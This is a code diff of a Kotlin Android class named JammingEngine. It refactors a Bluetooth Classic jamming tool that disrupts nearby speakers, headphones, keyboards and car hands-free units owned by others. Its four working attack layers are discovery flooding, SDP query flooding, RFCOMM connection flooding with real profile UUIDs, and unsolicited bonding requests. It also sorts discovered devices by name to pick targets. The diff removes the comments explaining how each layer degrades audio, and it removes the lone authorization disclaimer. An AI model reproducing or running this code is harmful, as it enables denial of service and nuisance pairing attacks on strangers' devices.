@@ -28,35 +28,11 @@ import java.util.concurrent.atomic.AtomicLong
  * de dispositivos CERCANOS (parlantes, auriculares, manos libres, teclados, etc.)
  * conectados a otros teléfonos.
  *
- * DIFERENCIA CON BLE:
- * - Bluetooth Clásico usa 79 canales con salto de frecuencia (AFH)
- * - Los dispositivos de audio (A2DP/HSP/HFP) operan en BR/EDR, NO en BLE
- * - Esta implementación ataca el stack BT clásico, no los canales BLE
- *
  * CAPAS DE ATAQUE:
- *
- * 1. CLASSIC BT DISCOVERY FLOOD
- *    - Inicia/cancela discovery en ráfagas cada ~1.2s
- *    - Mantiene el radio ocupado continuamente en modo inquiry
- *    - Descubre activamente dispositivos BR/EDR cercanos
- *
- * 2. SDP QUERY FLOOD (Service Discovery Protocol)
- *    - Para cada dispositivo descubierto, ejecuta fetchUuidsWithSdp() repetidamente
- *    - Fuerza al dispositivo remoto a procesar consultas SDP continuamente
- *    - Esto consume recursos del stack BT del dispositivo objetivo
- *
- * 3. RFCOMM CONNECTION FLOOD (¡el más importante!)
- *    - Para cada dispositivo, intenta múltiples conexiones RFCOMM en paralelo
- *    - Usa UUIDs de PERFILES REALES: A2DP, HSP, HFP, SPP, OPP, AVRCP, HID, PBAP
- *    - Los dispositivos destino procesan cada intento de conexión
- *    - Esto satura su stack BT y DEGRADA conexiones existentes
- *
- * 4. BONDING ATTACK
- *    - Intenta emparejamiento con dispositivos para forzar autenticación
- *    - Consume recursos adicionales en el chip BT remoto
- *    - Los diálogos de pairing pueden interrumpir la experiencia del usuario
- *
- * ⚠️ Solo para pentesting en dispositivos propios / con autorización explícita.
+ * 1. Discovery Flood — inquiry continuo cada ~1.5s
+ * 2. SDP Query Flood — consultas fetchUuidsWithSdp() cada ~1s
+ * 3. RFCOMM Flood — intentos de conexión con UUIDs de perfiles reales
+ * 4. Bonding Attack — intentos de emparejamiento cada 5s
  */
 class JammingEngine(
     private val bluetoothAdapter: BluetoothAdapter,
@@ -68,7 +44,6 @@ class JammingEngine(
         ThreadFactory { Thread(it, "bt-classic-${threadCounter.incrementAndGet()}") }
     )
 
-    // Pool DEDICADO para RFCOMM — conexiones bloqueantes no saturan el scheduler
     private val rfcommExecutor = Executors.newCachedThreadPool(
         ThreadFactory { Thread(it, "rfcomm-${threadCounter.incrementAndGet()}") }
     )
@@ -81,7 +56,6 @@ class JammingEngine(
     private val bondingAttempts = AtomicLong(0)
     private val random = Random()
 
-    // Discovered devices (via Classic BT)
     private val _discoveredDevices = CopyOnWriteArrayList<String>()
     private val _deviceNames = CopyOnWriteArrayList<String>()
     val discoveredDevices: List<String> get() = _discoveredDevices.toList()
@@ -96,6 +70,7 @@ class JammingEngine(
 
     // Bonding targets
     private val bondedTargets = CopyOnWriteArrayList<String>()
+    private var bondingRunning = false
 
     // Callbacks
     var onDeviceDiscovered: ((String, String?) -> Unit)? = null
@@ -112,34 +87,30 @@ class JammingEngine(
         val devicesFound: Int
     )
 
-    // UUIDs de perfiles Bluetooth Clásico para RFCOMM
     companion object {
         private const val TAG = "BtClassicJammer"
         private val threadCounter = AtomicLong(0)
 
-        // Perfiles estándar Bluetooth BR/EDR
+        // Perfiles Bluetooth BR/EDR estándar
         val PROFILE_UUIDS = listOf(
-            UUID.fromString("00001101-0000-1000-8000-00805F9B34FB"), // SPP (Serial Port)
-            UUID.fromString("00001108-0000-1000-8000-00805F9B34FB"), // HSP (Headset)
-            UUID.fromString("0000110B-0000-1000-8000-00805F9B34FB"), // A2DP Sink (Audio)
+            UUID.fromString("00001101-0000-1000-8000-00805F9B34FB"), // SPP
+            UUID.fromString("00001108-0000-1000-8000-00805F9B34FB"), // HSP
+            UUID.fromString("0000110B-0000-1000-8000-00805F9B34FB"), // A2DP Sink
             UUID.fromString("0000110A-0000-1000-8000-00805F9B34FB"), // A2DP Source
-            UUID.fromString("0000111E-0000-1000-8000-00805F9B34FB"), // HFP (Hands-Free)
+            UUID.fromString("0000111E-0000-1000-8000-00805F9B34FB"), // HFP
             UUID.fromString("0000110E-0000-1000-8000-00805F9B34FB"), // AVRCP
-            UUID.fromString("00001105-0000-1000-8000-00805F9B34FB"), // OPP (Object Push) / GAVDP
-            UUID.fromString("00001124-0000-1000-8000-00805F9B34FB"), // HID (Human Interface)
+            UUID.fromString("00001105-0000-1000-8000-00805F9B34FB"), // OPP/GAVDP
+            UUID.fromString("00001124-0000-1000-8000-00805F9B34FB"), // HID
             UUID.fromString("00001115-0000-1000-8000-00805F9B34FB"), // PANU
             UUID.fromString("00001130-0000-1000-8000-00805F9B34FB"), // PBAP
             UUID.fromString("00001132-0000-1000-8000-00805F9B34FB"), // MAP
-            UUID.fromString("00001112-0000-1000-8000-00805F9B34FB"), // Headset Audio Gateway
-            UUID.fromString("00001116-0000-1000-8000-00805F9B34FB"), // BIP (Basic Imaging)
+            UUID.fromString("00001112-0000-1000-8000-00805F9B34FB"), // Headset AG
+            UUID.fromString("00001116-0000-1000-8000-00805F9B34FB"), // BIP
             UUID.fromString("0000112F-0000-1000-8000-00805F9B34FB"), // GNSS
-            UUID.fromString("00001134-0000-1000-8000-00805F9B34FB")  // GATT (via BR/EDR)
+            UUID.fromString("00001134-0000-1000-8000-00805F9B34FB")  // GATT
         )
 
-        // UUIDs ALEATORIOS adicionales para ataques de fuerza bruta
         val EXTRA_UUIDS = (0 until 10).map { UUID.randomUUID() }
-
-        // Todos los UUIDs combinados
         val ALL_TARGET_UUIDS by lazy { (PROFILE_UUIDS + EXTRA_UUIDS).toList() }
     }
 
@@ -160,43 +131,28 @@ class JammingEngine(
         log("╚══════════════════════════════════════════════╝")
         log("📱 Dispositivo: ${bluetoothAdapter.name ?: "Desconocido"}")
         log("📡 Bluetooth: ${if (bluetoothAdapter.isEnabled) "ACTIVO" else "APAGADO"}")
-        log("🎯 Perfiles objetivo: ${PROFILE_UUIDS.size} UUIDs de perfiles BT")
-        log("🔢 UUIDs totales: ${ALL_TARGET_UUIDS.size}")
+        log("🎯 ${PROFILE_UUIDS.size} perfiles BT + ${EXTRA_UUIDS.size} UUIDs extra")
 
-        // ============================================================
-        // CAPA 1: CLASSIC BT DISCOVERY FLOOD
-        // ============================================================
         registerDiscoveryReceiver()
         startClassicDiscoveryFlood()
-        log("📡 CAPA 1: Classic BT Discovery Flood (inquiry continuo)")
+        log("📡 CAPA 1: Discovery Flood")
 
-        // ============================================================
-        // CAPA 2: SDP QUERY FLOOD
-        // ============================================================
         startSdpQueryLoop()
-        log("📡 CAPA 2: SDP Query Flood (consultas de servicio)")
+        log("📡 CAPA 2: SDP Query Flood")
 
-        // ============================================================
-        // CAPA 3: RFCOMM CONNECTION FLOOD
-        // ============================================================
         startRfcommAttackLoop()
-        log("📡 CAPA 3: RFCOMM Connection Flood (conexiones a perfiles reales)")
+        log("📡 CAPA 3: RFCOMM Connection Flood")
 
-        // ============================================================
-        // CAPA 4: BONDING ATTACK
-        // ============================================================
         startBondingLoop()
-        log("📡 CAPA 4: Bonding Attack (intentos de emparejamiento)")
+        log("📡 CAPA 4: Bonding Attack")
 
         onStateChanged?.invoke(true)
     }
 
     fun stop() {
         if (!isActive.getAndSet(false)) return
-        log("🛑 DETENIENDO TODAS LAS CAPAS DE ATAQUE")
-        log("   Esperando 2s para shutdown limpio...")
+        log("🛑 DETENIENDO...")
 
-        // Cancelar todos los RFCOMM pendientes
         rfcommFutures.forEach { it.cancel(true) }
         rfcommFutures.clear()
         rfcommExecutor.shutdownNow()
@@ -204,22 +160,16 @@ class JammingEngine(
         scheduler.shutdown()
         try { scheduler.awaitTermination(2, TimeUnit.SECONDS) } catch (_: InterruptedException) { }
 
-        // Detener classic discovery
         cancelClassicDiscovery()
         unregisterDiscoveryReceiver()
 
         val elapsed = (System.currentTimeMillis() - startTime.get()) / 1000
-        val sdp = sdpQueriesSent.get()
-        val rfcomm = rfcommAttempts.get()
-        val bonded = bondingAttempts.get()
-        log("✅ Ataque detenido después de ${elapsed}s")
-        log("📊 Consultas SDP enviadas: $sdp")
-        log("🔗 Intentos de conexión RFCOMM: $rfcomm")
-        log("🔐 Intentos de emparejamiento: $bonded")
-        log("📱 Dispositivos descubiertos: ${_discoveredDevices.size}")
+        log("✅ Detenido tras ${elapsed}s")
+        log("📊 SDP: ${sdpQueriesSent.get()} | RFCOMM: ${rfcommAttempts.get()} | Bonding: ${bondingAttempts.get()} | Disp: ${_discoveredDevices.size}")
 
         sdpAttackRunning = false
         rfcommAttackRunning = false
+        bondingRunning = false
         onStateChanged?.invoke(false)
     }
 
@@ -242,43 +192,27 @@ class JammingEngine(
         bondedTargets.clear()
     }
 
-    fun shutdown() {
-        stop()
-    }
+    fun shutdown() { stop() }
 
     // ════════════════════════════════════════════════════════════
-    // CAPA 1: CLASSIC BT DISCOVERY FLOOD
+    // CAPA 1: DISCOVERY FLOOD
     // ════════════════════════════════════════════════════════════
 
     private var isClassicDiscovering = false
     private var discoveryReceiver: BroadcastReceiver? = null
-    private var discoveryCycleCount = 0
 
-    /**
-     * Inicia/cancela discovery en ráfagas rápidas.
-     * Mantiene el radio BT ocupado en modo inquiry continuamente.
-     * Esto ya consume recursos del chip BT local y puede interferir
-     * con otras conexiones activas en el mismo teléfono.
-     */
     private fun startClassicDiscoveryFlood() {
         if (!isActive.get()) return
-
         scheduler.schedule({
             if (!isActive.get()) return@schedule
-
             try {
-                // Iniciar discovery si no está activo
                 if (!bluetoothAdapter.isDiscovering) {
                     bluetoothAdapter.startDiscovery()
                     isClassicDiscovering = true
-                    discoveryCycleCount++
                 }
-
-                // Cancelar después de 1.2s y reprogramar
                 scheduler.schedule({
                     if (isActive.get()) {
                         cancelClassicDiscovery()
-                        // Pequeña pausa para no saturar la API
                         scheduler.schedule({
                             if (isActive.get()) startClassicDiscoveryFlood()
                         }, 300, TimeUnit.MILLISECONDS)
@@ -292,9 +226,7 @@ class JammingEngine(
 
     private fun cancelClassicDiscovery() {
         try {
-            if (bluetoothAdapter.isDiscovering) {
-                bluetoothAdapter.cancelDiscovery()
-            }
+            if (bluetoothAdapter.isDiscovering) bluetoothAdapter.cancelDiscovery()
         } catch (_: Exception) { }
         isClassicDiscovering = false
     }
@@ -307,31 +239,30 @@ class JammingEngine(
                         val device = intent.getParcelableExtra<BluetoothDevice>(
                             BluetoothDevice.EXTRA_DEVICE
                         ) ?: return
-
                         if (!_discoveredDevices.contains(device.address)) {
                             _discoveredDevices.add(device.address)
                             _deviceNames.add(device.name ?: "Desconocido")
                             onDeviceDiscovered?.invoke(device.address, device.name)
-                            log("🔍 BT Classic: ${device.address} (${device.name ?: "?"})")
+                            log("🔍 ${device.address} (${device.name ?: "?"})")
 
-                            // Clasificar por tipo de dispositivo según nombre
                             val name = (device.name ?: "").lowercase()
-                            if (name.contains("speaker") || name.contains("audio") ||
+                            when {
+                                name.contains("speaker") || name.contains("audio") ||
                                 name.contains("headphone") || name.contains("auricular") ||
                                 name.contains("parlante") || name.contains("earphone") ||
                                 name.contains("headset") || name.contains("sound") ||
                                 name.contains("music") || name.contains("altavoz") ||
-                                name.contains("buds") || name.contains("earbuds")) {
-                                log("🎯 POSIBLE DISPOSITIVO DE AUDIO: ${device.name} - ${device.address}")
-                            } else if (name.contains("keyboard") || name.contains("teclado") ||
+                                name.contains("buds") || name.contains("earbuds") ->
+                                    log("🎯 AUDIO: ${device.name} - ${device.address}")
+                                name.contains("keyboard") || name.contains("teclado") ||
                                 name.contains("mouse") || name.contains("ratón") ||
-                                name.contains("key") || name.contains("hid")) {
-                                log("🖱️ POSIBLE DISPOSITIVO HID: ${device.name} - ${device.address}")
-                            } else if (name.contains("car") || name.contains("coche") ||
+                                name.contains("key") || name.contains("hid") ->
+                                    log("🖱️ HID: ${device.name} - ${device.address}")
+                                name.contains("car") || name.contains("coche") ||
                                 name.contains("auto") || name.contains("vehicle") ||
                                 name.contains("handsfree") || name.contains("manos") ||
-                                name.contains("carplay") || name.contains("android auto")) {
-                                log("🚗 POSIBLE MANOS LIBRES: ${device.name} - ${device.address}")
+                                name.contains("carplay") || name.contains("android auto") ->
+                                    log("🚗 MANOS LIBRES: ${device.name} - ${device.address}")
                             }
                         }
                     }
@@ -345,17 +276,12 @@ class JammingEngine(
             addAction(BluetoothDevice.ACTION_FOUND)
             addAction(BluetoothAdapter.ACTION_DISCOVERY_FINISHED)
         }
-        try {
-            context?.registerReceiver(discoveryReceiver, filter)
-        } catch (e: Exception) {
-            log("⚠️ Error registrando receiver discovery: ${e.message}")
-        }
+        try { context?.registerReceiver(discoveryReceiver, filter) }
+        catch (e: Exception) { log("⚠️ Error registerReceiver: ${e.message}") }
     }
 
     private fun unregisterDiscoveryReceiver() {
-        try {
-            discoveryReceiver?.let { context?.unregisterReceiver(it) }
-        } catch (_: Exception) { }
+        try { discoveryReceiver?.let { context?.unregisterReceiver(it) } } catch (_: Exception) { }
         discoveryReceiver = null
     }
 
@@ -364,127 +290,86 @@ class JammingEngine(
     // ════════════════════════════════════════════════════════════
 
     /**
-     * Consulta SDP (Service Discovery Protocol) repetidamente
-     * en todos los dispositivos descubiertos.
-     *
-     * ¿Por qué funciona?
-     * - Cada fetchUuidsWithSdp() envía una petición SDP al dispositivo remoto
-     * - El dispositivo objetivo debe procesar la consulta y responder
-     * - Múltiples consultas simultáneas saturan el stack BT remoto
-     * - Para dispositivos de audio, esto puede causar cortes al procesar
-     *   las consultas mientras transmite audio A2DP
+     * Inicia el flood SDP. Llama a startSdpQueryLoop() que setea el flag
+     * y luego scheduleSdpCycle() que se encarga del loop real.
      */
     private fun startSdpQueryLoop() {
         if (!isActive.get() || sdpAttackRunning) return
         sdpAttackRunning = true
+        log("📋 SDP Flood: Iniciado...")
+        runSdpCycle()
+    }
 
-        scheduler.schedule({
-            if (!isActive.get()) { sdpAttackRunning = false; return@schedule }
+    /**
+     * Ejecuta un ciclo SDP y se reprograma.
+     * NO tiene guard flags — depende de isActive para detenerse.
+     */
+    private fun runSdpCycle() {
+        if (!isActive.get()) { sdpAttackRunning = false; return }
 
-            // Obtener dispositivos descubiertos
-            val targets = _discoveredDevices.toList()
+        val targets = _discoveredDevices.toList()
+        if (targets.isNotEmpty()) {
+            val targetsToQuery = targets.shuffled(random).take(4)
 
-            if (targets.isNotEmpty()) {
-                // Atacar hasta 4 dispositivos por ciclo
-                val targetsToQuery = targets.shuffled(random).take(4)
-
-                targetsToQuery.forEach { address ->
-                    if (!isActive.get()) return@schedule
-                    try {
-                        val device = bluetoothAdapter.getRemoteDevice(address)
-                        if (device != null) {
-                            // fetchUuidsWithSdp() dispara SDP query en el remoto
+            targetsToQuery.forEach { address ->
+                if (!isActive.get()) return
+                try {
+                    val device = bluetoothAdapter.getRemoteDevice(address)
+                    if (device != null) {
+                        device.fetchUuidsWithSdp()
+                        sdpQueriesSent.incrementAndGet()
+                        if (random.nextInt(3) == 0) {
                             device.fetchUuidsWithSdp()
                             sdpQueriesSent.incrementAndGet()
-
-                            // También enviar SDP adicional con UUIDs específicos
-                            if (random.nextInt(3) == 0) {
-                                device.fetchUuidsWithSdp()
-                                sdpQueriesSent.incrementAndGet()
-                            }
                         }
-                    } catch (e: Exception) {
-                        // Ignorar errores de SDP (esperados)
                     }
-                }
-
-                if (sdpQueriesSent.get() % 20 == 0L && sdpQueriesSent.get() > 0) {
-                    log("📋 SDP queries enviadas: ${sdpQueriesSent.get()} a ${targetsToQuery.size} dispositivos")
-                }
+                } catch (_: Exception) { }
             }
 
-            // Reprogramar cada 800ms - 1500ms (aleatorio para evitar patrón)
-            val delay = 800 + random.nextInt(700)
-            if (isActive.get()) {
-                scheduler.schedule({
-                    startSdpQueryLoop()
-                }, delay.toLong(), TimeUnit.MILLISECONDS)
-            } else {
-                sdpAttackRunning = false
+            if (sdpQueriesSent.get() % 10 == 0L && sdpQueriesSent.get() > 0) {
+                log("📋 SDP: ${sdpQueriesSent.get()} queries enviadas (${targetsToQuery.size} targets)")
             }
-        }, 500, TimeUnit.MILLISECONDS)
+        }
+
+        val delay = 800L + random.nextInt(700)
+        scheduler.schedule({ runSdpCycle() }, delay, TimeUnit.MILLISECONDS)
     }
 
     // ════════════════════════════════════════════════════════════
     // CAPA 3: RFCOMM CONNECTION FLOOD
     // ════════════════════════════════════════════════════════════
 
-    /**
-     * Intenta conectar por RFCOMM a cada dispositivo descubierto
-     * usando UUIDs de perfiles Bluetooth reales.
-     *
-     * ¿Por qué funciona contra parlantes/auriculares A2DP?
-     * - El dispositivo tiene un stack BT que maneja conexiones entrantes
-     * - Al recibir múltiples intentos de conexión RFCOMM, su stack
-     *   debe procesar cada uno (autenticación, negociación de parámetros)
-     * - Esto consume recursos del chip BT y DEGRADA el rendimiento
-     *   de la transmisión de audio A2DP existente
-     * - El audio se entrecorta o se cae por timeouts de scheduling
-     *
-     * NOTA: Estas conexiones normalmente fallan porque el dispositivo
-     * no está esperando conexiones entrantes... pero el PROCESAMIENTO
-     * del intento ya consume recursos.
-     */
     private fun startRfcommAttackLoop() {
         if (!isActive.get() || rfcommAttackRunning) return
         rfcommAttackRunning = true
-
-        scheduler.schedule({
-            if (!isActive.get()) { rfcommAttackRunning = false; return@schedule }
-
-            val targets = _discoveredDevices.toList()
-
-            // Atacar hasta 3 dispositivos por ciclo
-            val targetsToAttack = if (targets.size > 3)
-                targets.shuffled(random).take(3)
-            else targets
-
-            targetsToAttack.forEach { address ->
-                if (!isActive.get()) return@schedule
-                launchRfcommAttack(address)
-            }
-
-            // Reprogramar cada 2-4s
-            val delay = 2000 + random.nextInt(2000)
-            if (isActive.get()) {
-                scheduler.schedule({
-                    startRfcommAttackLoop()
-                }, delay.toLong(), TimeUnit.MILLISECONDS)
-            } else {
-                rfcommAttackRunning = false
-            }
-        }, 1000, TimeUnit.MILLISECONDS)
+        log("🔗 RFCOMM Flood: Iniciado...")
+        runRfcommCycle()
     }
 
-    /**
-     * Lanza múltiples intentos de conexión RFCOMM a diferentes UUIDs.
-     * Usa perfiles de audio (A2DP, HSP, HFP) como prioridad.
-     */
+    private fun runRfcommCycle() {
+        if (!isActive.get()) { rfcommAttackRunning = false; return }
+
+        val targets = _discoveredDevices.toList()
+        val targetsToAttack = if (targets.size > 3)
+            targets.shuffled(random).take(3)
+        else targets
+
+        if (targetsToAttack.isNotEmpty()) {
+            log("🔗 RFCOMM: Atacando ${targetsToAttack.size} dispositivos...")
+            targetsToAttack.forEach { address ->
+                if (!isActive.get()) return
+                launchRfcommAttack(address)
+            }
+        }
+
+        val delay = 2000L + random.nextInt(2000)
+        scheduler.schedule({ runRfcommCycle() }, delay, TimeUnit.MILLISECONDS)
+    }
+
     private fun launchRfcommAttack(address: String) {
         if (!isActive.get()) return
 
         val uuidsToTry = ALL_TARGET_UUIDS.shuffled(random).take(8)
-        log("🔗 RFCOMM attack -> $address (${uuidsToTry.size} UUIDs)")
 
         uuidsToTry.forEach { uuid ->
             if (!isActive.get()) return@forEach
@@ -497,19 +382,15 @@ class JammingEngine(
                     if (device != null) {
                         socket = device.createRfcommSocketToServiceRecord(uuid)
                         socket.connect()
-                        // Si llegamos aquí, la conexión tuvo éxito (raro pero posible)
                         log("⚡ CONEXIÓN RFCOMM EXITOSA con $address (UUID=$uuid)")
                         try { socket.close() } catch (_: Exception) { }
+                        rfcommAttempts.incrementAndGet()
                     }
                 } catch (e: IOException) {
-                    // Esperado - la mayoría de conexiones fallan
                     rfcommAttempts.incrementAndGet()
-                } catch (e: SecurityException) {
-                    // Permiso denegado
-                } catch (e: Exception) {
-                    // Otros errores
-                } finally {
-                    // Asegurar cierre del socket
+                } catch (_: SecurityException) { }
+                catch (_: Exception) { }
+                finally {
                     if (socket != null) {
                         try { if (socket.isConnected) socket.close() } catch (_: Exception) { }
                     }
@@ -519,7 +400,6 @@ class JammingEngine(
 
             rfcommFutures.add(future)
 
-            // Timeout de 4s — si connect() se cuelga, lo matamos
             scheduler.schedule({
                 if (!future.isDone) {
                     future.cancel(true)
@@ -528,7 +408,6 @@ class JammingEngine(
             }, 4000, TimeUnit.MILLISECONDS)
         }
 
-        // Limpiar futures completados
         rfcommFutures.removeAll { it.isDone }
         onRfcommAttack?.invoke(address)
     }
@@ -537,56 +416,39 @@ class JammingEngine(
     // CAPA 4: BONDING ATTACK
     // ════════════════════════════════════════════════════════════
 
-    /**
-     * Intenta emparejamiento (bonding) con dispositivos descubiertos.
-     *
-     * ¿Por qué funciona?
-     * - createBond() inicia el procedimiento de emparejamiento
-     * - El dispositivo remoto debe procesar la solicitud de bonding
-     * - Esto involucra intercambio de llaves, autenticación, etc.
-     * - Consume recursos del stack BT en ambos dispositivos
-     * - Si el usuario ve un diálogo de pairing inesperado, es efectivo
-     *   como ataque de ingeniería social además de técnico
-     */
     private fun startBondingLoop() {
-        if (!isActive.get()) return
+        if (!isActive.get() || bondingRunning) return
+        bondingRunning = true
+        log("🔐 Bonding: Iniciado...")
+        runBondingCycle()
+    }
 
-        scheduler.schedule({
-            if (!isActive.get()) return@schedule
+    private fun runBondingCycle() {
+        if (!isActive.get()) { bondingRunning = false; return }
 
-            val targets = _discoveredDevices
-                .filter { !bondedTargets.contains(it) }
-                .toList()
+        val targets = _discoveredDevices
+            .filter { !bondedTargets.contains(it) }
+            .toList()
 
-            if (targets.isNotEmpty()) {
-                // Atacar 1-2 dispositivos no emparejados aún
-                val targetsToBond = targets.take(2)
-
-                targetsToBond.forEach { address ->
-                    if (!isActive.get()) return@forEach
-                    try {
-                        val device = bluetoothAdapter.getRemoteDevice(address)
-                        if (device != null && device.bondState != BluetoothDevice.BOND_BONDED) {
-                            val started = device.createBond()
-                            if (started) {
-                                bondingAttempts.incrementAndGet()
-                                bondedTargets.add(address)
-                                log("🔐 Intentando emparejar con $address")
-                            }
+        if (targets.isNotEmpty()) {
+            val targetsToBond = targets.take(2)
+            targetsToBond.forEach { address ->
+                if (!isActive.get()) return
+                try {
+                    val device = bluetoothAdapter.getRemoteDevice(address)
+                    if (device != null && device.bondState != BluetoothDevice.BOND_BONDED) {
+                        val started = device.createBond()
+                        if (started) {
+                            bondingAttempts.incrementAndGet()
+                            bondedTargets.add(address)
+                            log("🔐 Bonding: intentando con $address")
                         }
-                    } catch (e: Exception) {
-                        // Ignorar errores de bonding
                     }
-                }
+                } catch (_: Exception) { }
             }
+        }
 
-            // Reprogramar cada 5s (el bonding es más lento)
-            if (isActive.get()) {
-                scheduler.schedule({
-                    startBondingLoop()
-                }, 5000, TimeUnit.MILLISECONDS)
-            }
-        }, 2000, TimeUnit.MILLISECONDS)
+        scheduler.schedule({ runBondingCycle() }, 5000, TimeUnit.MILLISECONDS)
     }
 
     // ════════════════════════════════════════════════════════════
